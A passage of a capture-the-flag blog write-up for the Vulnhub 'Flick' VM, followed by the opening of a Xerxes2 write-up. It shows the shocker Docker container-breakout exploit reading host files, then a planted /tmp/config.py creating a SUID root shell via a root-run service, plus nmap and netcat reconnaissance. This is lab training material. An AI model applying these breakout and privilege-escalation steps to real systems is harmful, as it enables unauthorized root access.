robin@flick:~$ docker build -t shocker/shocker shocker/
Uploading context 101.4 kB
Uploading context
Step 0 : FROM ubuntu
 &mdash;> ba5877dc9bec
Step 1 : RUN apt-get update &amp;&amp; apt-get install -yq build-essential
 &mdash;> Using cache
 &mdash;> fe0bdac7e278
Step 2 : ADD . /app
 &mdash;> b1c818249f2f
Removing intermediate container 80d78a2e42ff
Step 3 : WORKDIR /app
 &mdash;> Running in b670431898c9
 &mdash;> a8aea5e1a755
Removing intermediate container b670431898c9
Step 4 : RUN cc -Wall -std=c99 -O2 shocker.c -static -Wno-unused-result -o shocker
 &mdash;> Running in a19ed14d76b6
 &mdash;> 391372de38ec
Removing intermediate container a19ed14d76b6
Step 5 : CMD [&ldquo;./shocker&rdquo;]
 &mdash;> Running in 1572b7cb39e5
 &mdash;> 6a588733f8ce
Removing intermediate container 1572b7cb39e5
Successfully built 6a588733f8ce
robin@flick:~$ docker run shocker/shocker
[<strong><em>] docker VMM-container breakout Po&copy; 2014             [</em></strong>]
[<strong><em>] The tea from the 90&rsquo;s kicks your sekurity again.     [</em></strong>]
[<strong><em>] If you have pending sec consulting, I&rsquo;ll happily     [</em></strong>]
[<strong><em>] forward to my friends who drink secury-tea too!      [</em></strong>]
[<em>] Resolving &lsquo;root/flag.txt&rsquo;
[</em>] Found .
[<em>] Found mnt
[</em>] Found home
[<em>] Found root
[+] Match: root ino=130833
[</em>] Brute forcing remaining 32bit. This can take a while&hellip;
[<em>] (root) Trying: 0x00000000
[</em>] #=8, 1, char nh[] = {0x11, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};
[<em>] Resolving &lsquo;flag.txt&rsquo;
[</em>] Found .
[<em>] Found .bashrc
[</em>] Found .Xauthority
[<em>] Found 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
[</em>] Found flag.txt
[+] Match: flag.txt ino=165017
[<em>] Brute forcing remaining 32bit. This can take a while&hellip;
[</em>] (flag.txt) Trying: 0x00000000
[<em>] #=8, 1, char nh[] = {0x99, 0x84, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Got a final handle!
[</em>] #=8, 1, char nh[] = {0x99, 0x84, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Win! /root/flag.txt output follows:
Errr, you are close, but this is not the flag you are looking for.</p>

<p>robin@flick:~$
[/plain]</p>

<p>Wow, 1 it worked, and 2 this is not the flag you are looking for</p>

<p><img src="http://motorcycleradio.us/wp-content/uploads/2014/07/mindtrick.gif" alt="" /></p>

<p>I did notice, however, that it provides a directory listing when trying to find the file requested. There&rsquo;s a folder or file called 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc. I wonder if that is either the flag, or if the flag is in it ?</p>

<p>Firstly lets try requesting it as a file by changing the source code, compile and run it</p>

<p>[c]if (find_handle(fd1, &ldquo;/root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc&rdquo;, &amp;root_h, &amp;h) &lt;= 0)
[/c]</p>

<p>[plain gutter=&ldquo;false&rdquo;]
robin@flick:~$ docker build -t shocker/shocker shocker/
Uploading context 101.9 kB
Uploading context
Step 0 : FROM ubuntu
 &mdash;> ba5877dc9bec
Step 1 : RUN apt-get update &amp;&amp; apt-get install -yq build-essential
 &mdash;> Using cache
 &mdash;> fe0bdac7e278
Step 2 : ADD . /app
 &mdash;> 4ccef4da8ae5
Removing intermediate container 8cb273148a08
Step 3 : WORKDIR /app
 &mdash;> Running in 661ce7955eae
 &mdash;> 66c9d4b419e6
Removing intermediate container 661ce7955eae
Step 4 : RUN cc -Wall -std=c99 -O2 shocker.c -static -Wno-unused-result -o shocker
 &mdash;> Running in 969fcb8e2910
 &mdash;> edd283652f36
Removing intermediate container 969fcb8e2910
Step 5 : CMD [&ldquo;./shocker&rdquo;]
 &mdash;> Running in bbadcbb89ef2
 &mdash;> 41afb4ce762a
Removing intermediate container bbadcbb89ef2
Successfully built 41afb4ce762a
robin@flick:~$ docker run shocker/shocker
[<strong><em>] docker VMM-container breakout Po&copy; 2014             [</em></strong>]
[<strong><em>] The tea from the 90&rsquo;s kicks your sekurity again.     [</em></strong>]
[<strong><em>] If you have pending sec consulting, I&rsquo;ll happily     [</em></strong>]
[<strong><em>] forward to my friends who drink secury-tea too!      [</em></strong>]
[<em>] Resolving &lsquo;root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc&rsquo;
[</em>] Found .
[<em>] Found mnt
[</em>] Found home
[<em>] Found root
[+] Match: root ino=130833
[</em>] Brute forcing remaining 32bit. This can take a while&hellip;
[<em>] (root) Trying: 0x00000000
[</em>] #=8, 1, char nh[] = {0x11, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};
[<em>] Resolving &lsquo;53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc&rsquo;
[</em>] Found .
[<em>] Found .bashrc
[</em>] Found .Xauthority
[<em>] Found 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
[+] Match: 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc ino=138648
[</em>] Brute forcing remaining 32bit. This can take a while&hellip;
[<em>] (53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc) Trying: 0x00000000
[</em>] #=8, 1, char nh[] = {0x98, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Got a final handle!
[*] #=8, 1, char nh[] = {0x98, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
[-] read: Is a directory
robin@flick:~$
[/plain]</p>

<p>It&rsquo;s a directory, so we need to know the file name. If I request a random filename, I will still get a folder listing, so changing the source code to</p>

<p>[c]if (find_handle(fd1, &ldquo;/root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/random.txt&rdquo;, &amp;root_h, &amp;h) &lt;= 0)
[/c]</p>

<p>results in the following when compiled and run</p>

<p>[plain gutter=&ldquo;false&rdquo;]
robin@flick:~$ docker build -t shocker/shocker shocker/
Uploading context 101.9 kB
Uploading context
Step 0 : FROM ubuntu
 &mdash;> ba5877dc9bec
Step 1 : RUN apt-get update &amp;&amp; apt-get install -yq build-essential
 &mdash;> Using cache
 &mdash;> fe0bdac7e278
Step 2 : ADD . /app
 &mdash;> 218b0633106e
Removing intermediate container 2a354d2d7c4b
Step 3 : WORKDIR /app
^[[A &mdash;> Running in 957ed6b77fb3
 &mdash;> bbcee63e4d51
Removing intermediate container 957ed6b77fb3
Step 4 : RUN cc -Wall -std=c99 -O2 shocker.c -static -Wno-unused-result -o shocker
 &mdash;> Running in e283824b6a69
^[[A &mdash;> 7e02f111f1eb
Removing intermediate container e283824b6a69
Step 5 : CMD [&ldquo;./shocker&rdquo;]
^[[A &mdash;> Running in ef8d73127be9
 &mdash;> f532278bdca2
Removing intermediate container ef8d73127be9
Successfully built f532278bdca2
robin@flick:~$ docker run shocker/shocker
[<strong><em>] docker VMM-container breakout Po&copy; 2014             [</em></strong>]
[<strong><em>] The tea from the 90&rsquo;s kicks your sekurity again.     [</em></strong>]
[<strong><em>] If you have pending sec consulting, I&rsquo;ll happily     [</em></strong>]
[<strong><em>] forward to my friends who drink secury-tea too!      [</em></strong>]
[<em>] Resolving &lsquo;root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/random.txt&rsquo;
[</em>] Found .
[<em>] Found mnt
[</em>] Found home
[<em>] Found root
[+] Match: root ino=130833
[</em>] Brute forcing remaining 32bit. This can take a while&hellip;
[<em>] (root) Trying: 0x00000000
[</em>] #=8, 1, char nh[] = {0x11, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};
[<em>] Resolving &lsquo;53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/random.txt&rsquo;
[</em>] Found .
[<em>] Found .bashrc
[</em>] Found .Xauthority
[<em>] Found 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
[+] Match: 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc ino=138648
[</em>] Brute forcing remaining 32bit. This can take a while&hellip;
[<em>] (53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc) Trying: 0x00000000
[</em>] #=8, 1, char nh[] = {0x98, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
[<em>] Resolving &lsquo;random.txt&rsquo;
[</em>] Found .
[<em>] Found real_flag.txt
[</em>] Found ..
[*] Brute forcing remaining 32bit. This can take a while&hellip;
[-] Cannot find valid handle!: Bad file descriptor
robin@flick:~$
[/plain]</p>

<p>Our flag is actually called real_flag.txt, so a quick edit, compile and run, and we have the flag !</p>

<p>[c]
if (find_handle(fd1, &ldquo;/root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/real_flag.txt&rdquo;, &amp;root_h, &amp;h) &lt;= 0)[/c]</p>

<p>[plain gutter=&ldquo;false&rdquo;]
robin@flick:~$ docker build -t shocker/shocker shocker/
Uploading context 101.9 kB
Uploading context
Step 0 : FROM ubuntu
 &mdash;> ba5877dc9bec
Step 1 : RUN apt-get update &amp;&amp; apt-get install -yq build-essential
 &mdash;> Using cache
 &mdash;> fe0bdac7e278
Step 2 : ADD . /app
 &mdash;> c70bb87b476f
Removing intermediate container 9dc4cbb04db9
Step 3 : WORKDIR /app
 &mdash;> Running in 77dfcfa2bdd0
 &mdash;> e376b09e495d
Removing intermediate container 77dfcfa2bdd0
Step 4 : RUN cc -Wall -std=c99 -O2 shocker.c -static -Wno-unused-result -o shocker
 &mdash;> Running in 6d5d7089896d
 &mdash;> f3140f828bfc
Removing intermediate container 6d5d7089896d
Step 5 : CMD [&ldquo;./shocker&rdquo;]
 &mdash;> Running in 481824a260cb
 &mdash;> 2c7032dcfbd2
Removing intermediate container 481824a260cb
Successfully built 2c7032dcfbd2
robin@flick:~$ docker run shocker/shocker
[<strong><em>] docker VMM-container breakout Po&copy; 2014             [</em></strong>]
[<strong><em>] The tea from the 90&rsquo;s kicks your sekurity again.     [</em></strong>]
[<strong><em>] If you have pending sec consulting, I&rsquo;ll happily     [</em></strong>]
[<strong><em>] forward to my friends who drink secury-tea too!      [</em></strong>]
[<em>] Resolving &lsquo;root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/real_flag.txt&rsquo;
[</em>] Found .
[<em>] Found mnt
[</em>] Found home
[<em>] Found root
[+] Match: root ino=130833
[</em>] Brute forcing remaining 32bit. This can take a while&hellip;
[<em>] (root) Trying: 0x00000000
[</em>] #=8, 1, char nh[] = {0x11, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};
[<em>] Resolving &lsquo;53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/real_flag.txt&rsquo;
[</em>] Found .
[<em>] Found .bashrc
[</em>] Found .Xauthority
[<em>] Found 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
[+] Match: 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc ino=138648
[</em>] Brute forcing remaining 32bit. This can take a while&hellip;
[<em>] (53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc) Trying: 0x00000000
[</em>] #=8, 1, char nh[] = {0x98, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
[<em>] Resolving &lsquo;real_flag.txt&rsquo;
[</em>] Found .
[<em>] Found real_flag.txt
[+] Match: real_flag.txt ino=165015
[</em>] Brute forcing remaining 32bit. This can take a while&hellip;
[<em>] (real_flag.txt) Trying: 0x00000000
[</em>] #=8, 1, char nh[] = {0x97, 0x84, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Got a final handle!
[*] #=8, 1, char nh[] = {0x97, 0x84, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Win! /root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc output follows:
Congrats!</p>

<p>You have completed &lsquo;flick&rsquo;! I hope you have enjoyed doing it as much as I did creating it</p>

<p>ciao for now!
@leonjza</p>

<p>robin@flick:~$
[/plain]</p>

<p><img src="http://stream1.gifsoup.com/webroot/animatedgifs/1024795_o.gif" alt="" /></p>

<hr />

<h2>I&rsquo;m Always After the Bonus Points</h2>

<p>So, on Vulnhub, the text for Flick has this line in it</p>

<p>[plain]
As a bonus, can you get root command execution?
[/plain]</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/challenge_accepted.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/challenge_accepted.jpg" alt="challenge_accepted" /></a></p>

<p>Using the aforementioned Docker Container Breakout vulnerability, I read the contents of /opt/start_apache/restart.sh</p>

<p>[bash]</p>

<h1>!/bin/sh</h1>

<p>/usr/sbin/service apache2 restart
/usr/bin/supervisorctl restart all
[/bash]</p>

<p>OK, so, it&rsquo;s restarting apache and restarting all processes controlled by Supervisord. Supervisord stores config files in /etc/supervisor/conf.d. Using the Docker vuln to blind enumerate the files, I located /etc/supervisor/conf.d/start_apache.conf which I read</p>

<p>[plain]
[program:start_apache]
command=/opt/start_apache/start.py
process_name = %(program_name)s-80%(process_num)02d
stdout_logfile = /var/log/start_apache-80%(process_num)02d.log
stdout_logfile_maxbytes=100MB
stdout_logfile_backups=10
numprocs=1
directory=/opt/start_apache
stopwaitsecs=1
user=root
stopasgroup=true
[/plain]</p>

<p>/usr/bin/supervisorctl restart all is running /opt/start_apache/start.py. That&rsquo;s the next file I read with the Docker vuln</p>

<p>[python]</p>

<h1>!/usr/bin/python</h1>

<p>&lsquo;&rsquo;&lsquo;
    Simple socket server using threads. Used in the flick CTF
    Credit: <a href="http://www.binarytides.com/python-socket-server-code-example/">http://www.binarytides.com/python-socket-server-code-example/</a>
&rsquo;&lsquo;&rsquo;</p>

<p>import socket
import os, sys, signal
from thread import *
import subprocess</p>

<h1>import the directory containing our config, and prevent the bytcode writes</h1>

<p>sys.dont_write_bytecode = True</p>

<h1>see if /tmp has a configuration to load.</h1>

<h1>Debugging purposes only!!!</h1>

<p>if os.path.isfile(&lsquo;/tmp/config.py&rsquo;):
    sys.path.insert(0, &lsquo;/tmp&rsquo;)
else:
    sys.path.insert(0, &lsquo;/etc&rsquo;)</p>

<h1>import the config</h1>

<p>from config import config</p>

<p>HOST = &lsquo;&rsquo;   # Symbolic name meaning all available interfaces
PORT = 8881 # Arbitrary non-privileged port</p>

<p>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</p>

<h1>Bind socket to local host and port</h1>

<p>try:
    s.bind((HOST, PORT))
except socket.error as msg:
    print &lsquo;Bind failed. Error Code : &rsquo; + str(msg[0]) + &lsquo; Message &rsquo; + msg[1]
    sys.exit()</p>

<h1>Start listening on socket</h1>

<p>s.listen(10)</p>

<h1>Function for handling connections. This will be used to create threads</h1>

<p>def clientthread(conn):</p>

<pre><code>#Sending message to connected client
conn.send('Welcome to the admin server. A correct password will \'flick\' the switch and open a new door:\n&gt; ') #send only takes string

#infinite loop so that function do not terminate and thread do not end.
while True:

    #Receiving from client
    data = conn.recv(1024)
    reply = 'OK: ' + data
    if not data:
        break

# check if the password is tabupJievas8Knoj
if data.strip() == 'tabupJievas8Knoj':
    return_code = subprocess.call(config['command'], shell=True)
    if return_code == 0:
        reply += '\nAccepted! The door should be open now :poolparty:\n'
    else:
        reply += '\nAccepted, but it doesn\'t look like the door opened :&lt;\n'

# add the prompt again
reply += '\n&gt; '

    conn.sendall(reply)
#came out of loop
conn.close()
</code></pre>

<h1>now keep talking with the client</h1>

<p>while 1:
    #wait to accept a connection - blocking call
    conn, addr = s.accept()</p>

<pre><code>#start new thread takes 1st argument as a function name to be run, second is the tuple of arguments to the function.
start_new_thread(clientthread ,(conn,))
</code></pre>

<p>s.close()
[/python]</p>

<p>This script is the script that provides the service found on port 8881, and seems to get it&rsquo;s config from /tmp/config.py, and if that doesn&rsquo;t exist, /etc/config.py. I read /etc/config.py to get an idea of the syntax</p>

<p>[python]
config = {
    &lsquo;command&rsquo;: &lsquo;service apache2 restart&rsquo;
}
[/python]</p>

<p>Pretty simple. I can use this to execute a set of commands by creating /tmp/config.py with the following contents - this will take a copy of /bin/sh and put it in /tmp called rootshell, then set the SUID bit.</p>

<p>[python]
config = {
    &lsquo;command&rsquo;: &lsquo;cp /bin/sh /tmp/rootshell &amp;&amp; chmod 4777 /tmp/rootshell&rsquo;
}
[/python]</p>

<p>Now, when I run the /opt/start_apache/restart.sh script, /opt/start_apache/start.py will be run, which will result in /tmp/config.py being read instead of /etc/config.py.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
robin@flick:~$ sudo /opt/start_apache/restart.sh
 * Restarting web server apache2                                                                                                                                              apache2: Could not reliably determine the server&rsquo;s fully qualified domain name, using 127.0.1.1 for ServerName
 &hellip; waiting apache2: Could not reliably determine the server&rsquo;s fully qualified domain name, using 127.0.1.1 for ServerName
                                                                                                                                                                       [ OK ]
start_apache-8000: stopped
start_apache-8000: started
robin@flick:~$
[/plain]</p>

<p>Now, we know that typing the correct password runs the command - we know this firstly from the source code, and secondly because we used it to start the web server right at the beginning. All I should need to do is connect to port 8881, and type the correct password. It should then run my malicious command.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# nc 192.168.0.106 8881
Welcome to the admin server. A correct password will &lsquo;flick&rsquo; the switch and open a new door:</p>

<blockquote><p>tabupJievas8Knoj
OK: tabupJievas8Knoj</p></blockquote>

<p>Accepted! The door should be open now :poolparty:</p>

<blockquote><p>[/plain]</p></blockquote>

<p>Fingers crossed there&rsquo;s a rootshell file in /tmp</p>

<p>[plain gutter=&ldquo;false&rdquo;]
robin@flick:~$ ls -l /tmp
total 112
-rwxrwxrwx 1 robin robin     82 Aug 12 13:59 config.py
-rwsrwxrwx 1 root  root  109768 Aug 13 01:08 rootshell
robin@flick:~$
[/plain]</p>

<p>Well, what do you know - it worked ! Running /tmp/rootshell drops us to a root shell, where we can properly read the flag, and put our public key into authorized_keys.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
robin@flick:~$ /tmp/rootshell</p>

<h1>id</h1>

<p>uid=1000(robin) gid=1000(robin) euid=0(root) groups=0(root),999(docker),1000(robin)</p>

<h1>[/plain]</h1>

<p>And for completeness, an SSH session as root.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# ssh <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#111;&#58;&#x72;&#111;&#x6f;&#116;&#64;&#x31;&#57;&#50;&#46;&#49;&#54;&#x38;&#46;&#48;&#46;&#x31;&#48;&#x36;">&#114;&#x6f;&#x6f;&#x74;&#64;&#49;&#57;&#50;&#46;&#49;&#x36;&#56;&#46;&#48;&#x2e;&#x31;&#48;&#x36;</a></p>

<p> .o88o. oooo   o8o            oooo
 888 <code>"</code>888   <code>"'           </code>888
o888oo   888  oooo   .ooooo.   888  oooo
 888     888  <code>888  d88'</code>&ldquo;Y8  888 .8P&#8217;
 888     888   888  888        888888.
 888     888   888  888   .o8  888 <code>88b.
o888o   o888o o888o</code>Y8bod8P&#8217; o888o o888o</p>

<p>Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)</p>

<ul>
<li>Documentation:  <a href="https://help.ubuntu.com/">https://help.ubuntu.com/</a></li>
</ul>


<p>  System information as of Wed Aug 13 01:11:18 SAST 2014</p>

<p>  System load:  0.0               Processes:              90
  Usage of /:   39.8% of 6.99GB   Users logged in:        2
  Memory usage: 41%               IP address for eth0:    192.168.0.106
  Swap usage:   1%                IP address for docker0: 172.17.42.1</p>

<p>  Graph this data and manage this system at:
    <a href="https://landscape.canonical.com/">https://landscape.canonical.com/</a></p>

<p>79 packages can be updated.
51 updates are security updates.</p>

<p>New release &lsquo;14.04.1 LTS&rsquo; available.
Run &lsquo;do-release-upgrade&rsquo; to upgrade to it.</p>

<p>Last login: Wed Aug 13 00:59:56 2014 from 192.168.0.110
root@flick:~# id
uid=0(root) gid=0(root) groups=0(root)
root@flick:~#
[/plain]</p>

<p><img src="http://gifstumblr.com/images/haters-gonna-hate_1042.gif" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The Glory of The Many Demands your Capture or Destruction.]]></title>
    <link href="http://recrudesce.github.io/blog/2014/08/08/the-glory-of-the-many-demands-your-capture-or-destruction/"/>
    <updated>2014-08-08T13:16:46+01:00</updated>
    <id>http://recrudesce.github.io/blog/2014/08/08/the-glory-of-the-many-demands-your-capture-or-destruction</id>
    <content type="html"><![CDATA[<p>It&rsquo;s been a long wait, but <a href="http://twitter.com/barrebas">barrebas</a> released <a href="http://vulnhub.com/entry/xerxes-2,97/">Xerxes2 on Vulnhub</a>. I&rsquo;ve not broken into Xerxes1, so I figured what the hell, lets give this a go. It might take me ages, but it&rsquo;s all a learning curve, right ?  Here&rsquo;s how I became the first person to get root</p>

<blockquote>root@xerxes2:~# id
uid=0(root) gid=0(root) groups=0(root)

Yup. [#vulnhub](https://twitter.com/hashtag/vulnhub?src=hash) [#xerxes2](https://twitter.com/hashtag/xerxes2?src=hash) [@barrebas](https://twitter.com/barrebas) [@VulnHub](https://twitter.com/VulnHub)
> 
> &#8211; Russ Watts (@recrudesce) [August 8, 2014](https://twitter.com/recrudesce/statuses/497695207270658048)</blockquote>




<!-- more -->


<h2>Taking a Sneaky Peaky</h2>

<p>Usual stuff here, it makes sense to do some enumeration. The standard route is to start off with an NMAP scan</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# nmap -sS -T4 -O &ndash;script banner 192.168.0.102</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-08-04 15:09 BST
Nmap scan report for 192.168.0.102
Host is up (0.00032s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
|<em>banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
80/tcp   open  http
111/tcp  open  rpcbind
4444/tcp open  krb524
| banner: //OAxAAAAAAAAAAAAEluZm8AAAAPAAAB+AABnD0AAwYICw0QEhUXGhwfISQmKSs
|</em>uMDM1ODo9QUNG\x0ASEtNUFJVV1pcX2FkZmlrbnBzdXh6fYGDhoiLjZCSlZeanJ+hpKa&hellip;
8888/tcp open  sun-answerbook
MAC Address: 08:00:27:FA:1A:A6 (Cadmus Computer Systems)
No exact OS matches for host (If you know what OS is running on it, see <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> ).
TCP/IP fingerprint:
OS:SCAN(V=6.46%E=4%D=8/4%OT=22%CT=1%CU=33675%PV=Y%DS=1%DC=D%G=Y%M=080027%TM
OS:=53DF942E%P=i686-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS
OS:=8)OPS(O1=M5B4ST11NW3%O2=M5B4ST11NW3%O3=M5B4NNT11NW3%O4=M5B4ST11NW3%O5=M
OS:5B4ST11NW3%O6=M5B4ST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=38
OS:90)ECN(R=Y%DF=Y%T=40%W=3908%O=M5B4NNSNW3%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
OS:=40%CD=S)</p>

<p>Network Distance: 1 hop</p>

<p>OS detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 22.96 seconds
root@pwk:~#[/plain]</p>

<p>OK, so we have SSH, HTTP, RPC bind, 4444 and 8888. Port 4444 has returned a banner, which looks like an encoded string. We can get the full string using netcat.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# nc -nv 192.168.0.102 4444
nc: 192.168.0.102 4444 open
//OAxAAAAAAAAAAAAEluZm8AAAAPAAAB+AABnD0AAwYICw0QEhUXGhwfISQmKSsuMDM1ODo9QUNG
SEtNUFJVV1pcX2FkZmlrbnBzdXh6fYGDhoiLjZCSlZeanJ+hpKapq66ws7W4ur3Bw8bIy83Q0tXX
2tzf4eTm6evu8PP1+Pr9AAAAOUxBTUUzLjk5cgFuAAAAAAAAAAAUQCQEdSIAAEAAAZw9c+tDPgAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/zgMQAJiwOAClPQAEKEPV6vQ80
y3mm7PwTcTcXMesnZpqNXv3jxgVjyJ8MAAcI2DgPBxYueiIlbvfu73/y7vwn+7u7/+737u7v+6Ii
Ilf/7u///6O7u73/6IiIjv///+7u4oYiJ/u7u98ILi573//oiVuiInvoLnvoiECguLi57u7i4oKC
goKJUuKCgoZUu9y73wiI5Yue9wHAKAAYAMBcG4uLuHrhC0gNGRNptRqIxGIF9hY0ZCM8qOkBjB0f
z4qGhjW3XS8TqAboGJvfwWD/84LEKjYLupm/maACFJixkWAohA3YkmgtyB3CQDRcSgRcB7AAYyKY
AaPGy4sstmhFxWglI0GVLxFUi4cJwihomIWErHeQEghuZlE6YGi3fmJIFAyWXDxw3ZFM3dPW6e5c
J9TGB9I0SdqBmedSdkFWdkOnL5oZm5mYGajSim9NFaka6SC7tN1IX6btnETBj5oal90kVJLSTq1W
U6a9Ro/Vrut3QoJpKZ6bmizc86BumpN1rQnAkhKW4JOIVQ6q0th/lKggBGAGgLSsKgRLlO9qcv/z
gsQVLLvqfCncgAGp63vV7uMMyHQFDBiFIHAAmYcCoAUAvCliDGiFVTF4tGJX0ZhZRu6SKnHyp0EE
EEUDxggaIpJIN7n1mzpIKPmq1nVKoJJpqoKSdq0EJmtNbMk7otMUbpKQQTdJ90mNEkkltTUiigtS
aKzaqy3dBNlJVoJKZabpMy6K0F0JitTMgi6zZdSqW1ebuxx1vUq6Cl3NqTs9b11O15qg2kMkIoER</p>

<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em> Hundreds of lines later </em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>*****</p>

<p>Ql1KnTmDiAWivLiumNGocdxek7ovpCS2lxTBBQjoSENSSVPTyhUhqhbhDi7hglQCqQZymkiwbIYJ
okFFxPwG0kxBTUUzLjk5LjWqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqv/zgsT3L2wV3MAJn1iqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqkxBTUUzLjk5LjWqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq//OCxDsAAANIAAAA
AKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqo=
root@pwk:~# [/plain]</p>

<p><img src="http://www.hencewise.com/wordpress/wp-content/uploads/wide-eyes.gif" alt="" /></p>

<p>Well that was a lot more than I expected. But the = at the end screams Base64, so I need to copy the banner text into a text file (I don&rsquo;t need to show you this) and a-decrypting and hexediting I shall go.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# base64 -d in.txt > out.bin
root@pwk:~# hexedit out.bin</p>

<p>00000000   FF F3 80 C4  00 00 00 00  00 00 00 00  00 49 6E 66  6F 00 00 00  0F 00 00 01  &hellip;&hellip;&hellip;&hellip;.Info&hellip;&hellip;.
00000018   F8 00 01 9C  3D 00 03 06  08 0B 0D 10  12 15 17 1A  1C 1F 21 24  26 29 2B 2E  &hellip;.=&hellip;&hellip;&hellip;&hellip;.!$&amp;)+.
00000030   30 33 35 38  3A 3D 41 43  46 48 4B 4D  50 52 55 57  5A 5C 5F 61  64 66 69 6B  0358:=ACFHKMPRUWZ_adfik
00000048   6E 70 73 75  78 7A 7D 81  83 86 88 8B  8D 90 92 95  97 9A 9C 9F  A1 A4 A6 A9  npsuxz}&hellip;&hellip;&hellip;&hellip;&hellip;..
